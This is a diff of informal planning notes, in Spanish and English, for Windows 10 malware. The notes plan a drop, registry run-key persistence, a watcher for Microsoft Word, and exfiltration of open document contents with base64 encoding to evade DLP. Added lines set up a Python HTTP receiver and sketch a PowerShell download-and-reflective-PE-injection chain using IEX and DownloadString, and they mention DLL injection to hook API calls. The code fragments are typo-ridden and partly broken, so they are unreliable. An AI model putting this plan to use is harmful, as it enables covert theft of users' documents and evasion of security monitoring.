@@ -12,13 +12,13 @@ Write code for Windows 10 that:
  
 
 
-cuando dropeas compruebas si winword esta abierdo y exfiltras
+cuando dropeas: haces persistencia, lanzas watcher
 
 haces persistencia (a nivel usuario) que es una entrada en el registro para que se ejecute al inicio de sesión 
 
 pendiente -> watcher para ver cuando se abre el world
 
-exfiltrar el contenido de los documentos abiertos
+exfiltrar el contenido de los documentos abiertos --> basic dlp evasion encoding in base64. more advanced techniques like adding cypher.
 
 https://community.spiceworks.com/how_to/163884-getting-data-from-a-word-document-using-powershell
 
@@ -29,5 +29,25 @@ https://stackoverflow.com/questions/52074362/how-to-connect-powershell-script-to
 
 
 
+http server
+https://blog.anvileight.com/posts/simple-python-http-server/
 
-https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7
+pip install twisted
+twistd -no web --path=.
+
+
+
+
+
+in order to create a better malware or wanted to use other techniques reflectivePEInjection can be used
+
+
+
+IEX((New-Object System).DowloadString powershell infoKe-ReflectivePEInjection.ps1)
+$b = downloadstring(executable.bin)
+$c system.convert::frombase64string($b)
+Invoke-ReflectivePEInjection -PEBytes $c   /indicanto el proceso al que quieres ir
+
+
+
+process dll injection to hook windows api call 
